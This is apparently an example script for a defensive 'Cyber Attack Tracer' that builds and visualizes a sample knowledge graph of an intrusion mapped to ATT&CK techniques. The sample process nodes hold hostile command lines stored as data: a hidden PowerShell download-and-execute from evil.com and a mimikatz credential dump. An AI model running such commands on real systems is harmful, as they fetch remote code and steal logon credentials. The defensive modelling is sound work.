"""
Visualization Example Script

This script demonstrates the visualization capabilities of the Cyber Attack Tracer system.
It creates sample knowledge graphs and shows how to use different visualization methods.
"""

import os
import sys
import logging
import networkx as nx
from pathlib import Path

# Add parent directory to path to import modules
sys.path.append(str(Path(__file__).parent.parent))

from src.knowledge_graph.graph_visualizer import GraphVisualizer
from src.knowledge_graph.interactive_visualizer import InteractiveVisualizer

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def create_sample_graph():
    """Create a sample knowledge graph for demonstration."""
    graph = nx.DiGraph()
    
    # Add process nodes
    graph.add_node("process_1", type="process", name="cmd.exe", pid=1234, cmdline="cmd.exe /c whoami")
    graph.add_node("process_2", type="process", name="powershell.exe", pid=5678, 
                  cmdline="powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\"")
    graph.add_node("process_3", type="process", name="mimikatz.exe", pid=9012, 
                  cmdline="mimikatz.exe sekurlsa::logonpasswords")
    
    # Add network nodes
    graph.add_node("network_1", type="network", ip="192.168.1.100", port=49152, status="ESTABLISHED")
    graph.add_node("network_2", type="network", ip="203.0.113.1", port=443, status="ESTABLISHED")
    graph.add_node("network_3", type="network", ip="198.51.100.1", port=80, status="ESTABLISHED")
    
    # Add file nodes
    graph.add_node("file_1", type="file", path="C:\\Windows\\Temp\\payload.exe", size=256000)
    graph.add_node("file_2", type="file", path="C:\\Users\\Administrator\\Downloads\\mimikatz.exe", size=512000)
    
    # Add registry nodes
    graph.add_node("registry_1", type="registry", key="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                  value="payload.exe")
    
    # Add technique nodes
    graph.add_node("technique_1", type="technique", id="T1059.001", name="PowerShell", 
                  description="Adversaries may abuse PowerShell commands and scripts for execution.")
    graph.add_node("technique_2", type="technique", id="T1003.001", name="LSASS Memory", 
                  description="Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).")
    graph.add_node("technique_3", type="technique", id="T1547.001", name="Registry Run Keys / Startup Folder", 
                  description="Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.")
    
    # Add edges
    graph.add_edge("process_1", "process_2", type="spawned")
    graph.add_edge("process_2", "network_1", type="connected_to")
    graph.add_edge("network_1", "network_3", type="communicated_with")
    graph.add_edge("process_2", "file_1", type="created")
    graph.add_edge("file_1", "process_3", type="executed")
    graph.add_edge("process_3", "network_2", type="connected_to")
    graph.add_edge("process_3", "registry_1", type="modified")
    
    # Connect techniques to relevant nodes
    graph.add_edge("technique_1", "process_2", type="identified_in")
    graph.add_edge("technique_2", "process_3", type="identified_in")
    graph.add_edge("technique_3", "registry_1", type="identified_in")
    
    return graph

def demonstrate_static_visualization(graph):
    """Demonstrate static visualization capabilities."""
    logger.info("Demonstrating static visualization capabilities...")
    
    # Initialize visualizer
    visualizer = GraphVisualizer()
    
    # 1. Basic graph visualization
    logger.info("Creating basic graph visualization...")
    basic_graph_path = visualizer.visualize_graph(graph)
    logger.info(f"Basic graph visualization saved to: {basic_graph_path}")
    
    # 2. Technique-specific visualization
    logger.info("Creating technique-specific visualization...")
    technique_graph_path = visualizer.visualize_technique_subgraph(
        graph, "T1059.001", "PowerShell"
    )
    logger.info(f"Technique visualization saved to: {technique_graph_path}")
    
    # 3. Custom visualization with different settings
    logger.info("Creating custom visualization...")
    custom_settings = {
        "node_size": 700,
        "font_size": 10,
        "layout": "kamada_kawai",
        "process_color": "skyblue",
        "network_color": "lightgreen",
        "file_color": "gold",
        "registry_color": "salmon",
        "technique_color": "orchid"
    }
    custom_graph_path = visualizer.visualize_graph(
        graph, 
        filename="custom_graph.png",
        settings=custom_settings,
        title="Custom Knowledge Graph Visualization"
    )
    logger.info(f"Custom visualization saved to: {custom_graph_path}")
    
    # 4. Attack path visualization
    logger.info("Creating attack path visualization...")
    attack_path = ["process_1", "process_2", "file_1", "process_3", "registry_1"]
    path_graph_path = visualizer.visualize_attack_path(
        graph, 
        path=attack_path,
        filename="attack_path.png"
    )
    logger.info(f"Attack path visualization saved to: {path_graph_path}")
    
    # 5. Export as PDF with metadata
    logger.info("Exporting graph as PDF with metadata...")
    pdf_path = visualizer.export_graph_as_pdf(
        graph,
        filename="knowledge_graph_report.pdf",
        include_metadata=True
    )
    logger.info(f"PDF report saved to: {pdf_path}")
    
    # 6. Export as JSON for interactive visualization
    logger.info("Exporting graph as JSON...")
    json_path = visualizer.export_graph_as_json(
        graph,
        filename="knowledge_graph_data.json"
    )
    logger.info(f"JSON data saved to: {json_path}")
    
    return {
        "basic_graph": basic_graph_path,
        "technique_graph": technique_graph_path,
        "custom_graph": custom_graph_path,
        "attack_path": path_graph_path,
        "pdf_report": pdf_path,
        "json_data": json_path
    }

def demonstrate_interactive_visualization(graph):
    """Demonstrate interactive visualization capabilities."""
    logger.info("Demonstrating interactive visualization capabilities...")
    
    # Initialize visualizer
    visualizer = InteractiveVisualizer()
    
    # 1. Basic interactive visualization
    logger.info("Creating basic interactive visualization...")
    interactive_path = visualizer.create_interactive_visualization(
        graph,
        filename="interactive_graph.html"
    )
    logger.info(f"Interactive visualization saved to: {interactive_path}")
    
    # 2. Technique-specific interactive visualization
    logger.info("Creating technique-specific interactive visualization...")
    technique_interactive_path = visualizer.create_technique_visualization(
        graph, 
        technique_id="T1003.001", 
        technique_name="LSASS Memory"
    )
    logger.info(f"Technique interactive visualization saved to: {technique_interactive_path}")
    
    # 3. Attack path interactive visualization
    logger.info("Creating attack path interactive visualization...")
    attack_path = ["process_1", "process_2", "file_1", "process_3", "registry_1"]
    path_interactive_path = visualizer.create_attack_path_visualization(
        graph,
        path=attack_path,
        filename="interactive_attack_path.html"
    )
    logger.info(f"Attack path interactive visualization saved to: {path_interactive_path}")
    
    return {
        "interactive_graph": interactive_path,
        "technique_interactive": technique_interactive_path,
        "path_interactive": path_interactive_path
    }

def main():
    """Main function to demonstrate visualization capabilities."""
    try:
        logger.info("Starting visualization demonstration...")
        
        # Create sample graph
        graph = create_sample_graph()
        logger.info(f"Created sample graph with {graph.number_of_nodes()} nodes and {graph.number_of_edges()} edges")
        
        # Demonstrate static visualization
        static_results = demonstrate_static_visualization(graph)
        
        # Demonstrate interactive visualization
        interactive_results = demonstrate_interactive_visualization(graph)
        
        logger.info("Visualization demonstration completed successfully")
        logger.info("Generated visualizations:")
        
        for name, path in {**static_results, **interactive_results}.items():
            logger.info(f"- {name}: {path}")
            
    except Exception as e:
        logger.error(f"Error in visualization demonstration: {str(e)}")
        return 1
        
    return 0

if __name__ == "__main__":
    sys.exit(main())
